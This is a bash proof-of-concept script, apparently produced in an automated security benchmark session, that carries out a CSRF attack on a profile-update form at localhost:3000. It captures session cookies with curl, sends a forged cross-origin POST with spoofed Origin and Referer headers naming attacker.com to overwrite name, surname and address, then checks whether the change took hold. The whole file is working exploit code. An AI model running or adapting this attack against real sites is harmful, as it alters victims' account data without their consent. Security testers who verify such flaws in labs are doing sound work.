#!/bin/bash
# POC: Demonstrates CSRF attack on profile update form by sending cross-origin POST request without CSRF token validation
# Target: ./repo
# Created: 2025-11-07T21:55:42.155Z
# Session: benchmark-XBEN-077-24-mhpdz86a

# CSRF Attack POC - Profile Update Form
# This script demonstrates a cross-origin POST request to the profile update endpoint
# without CSRF token protection, simulating an attack from a malicious website

TARGET_URL="http://localhost:3000/"
ATTACKER_ORIGIN="http://attacker.com"
ATTACKER_REFERER="http://attacker.com/page"

echo "[*] CSRF Attack POC - Profile Update Form"
echo "[*] Target: $TARGET_URL"
echo "[*] Simulating attack from: $ATTACKER_ORIGIN"
echo ""

# Step 1: First, make a legitimate request to get the current profile
echo "[+] Step 1: Fetching current profile state..."
INITIAL_RESPONSE=$(curl -s -c /tmp/cookies.txt "$TARGET_URL")
echo "[+] Current form state retrieved"
echo ""

# Step 2: Simulate CSRF attack - Send malicious POST request with spoofed origin
echo "[+] Step 2: Sending CSRF attack payload..."
echo "    - Changing name to: CSRF_Attacker"
echo "    - Changing surname to: Hacked"
echo "    - Changing address to: Attacker Address"
echo ""

CSRF_RESPONSE=$(curl -s -b /tmp/cookies.txt -X POST "$TARGET_URL" \
  -H "Origin: $ATTACKER_ORIGIN" \
  -H "Referer: $ATTACKER_REFERER" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=CSRF_Attacker&surname=Hacked&address=Attacker%20Address")

echo "[+] Attack response received (HTTP 200 indicates success)"
echo ""

# Step 3: Verify the attack was successful
echo "[+] Step 3: Verifying profile was updated..."
VERIFICATION=$(curl -s -b /tmp/cookies.txt "$TARGET_URL")

if echo "$VERIFICATION" | grep -q "CSRF_Attacker"; then
  echo "[✓] SUCCESS: Profile name changed to 'CSRF_Attacker'"
  echo "[✓] CSRF vulnerability confirmed - Cross-origin request was accepted!"
  echo ""
  echo "[!] VULNERABILITY DETAILS:"
  echo "    - No CSRF token validation"
  echo "    - No Origin header checking"
  echo "    - No Referer header validation"
  echo "    - SameSite cookie not enforced"
  echo "    - Cross-origin POST accepted without protection"
  exit 0
else
  echo "[✗] Profile update failed - CSRF protection may be in place"
  exit 1
fi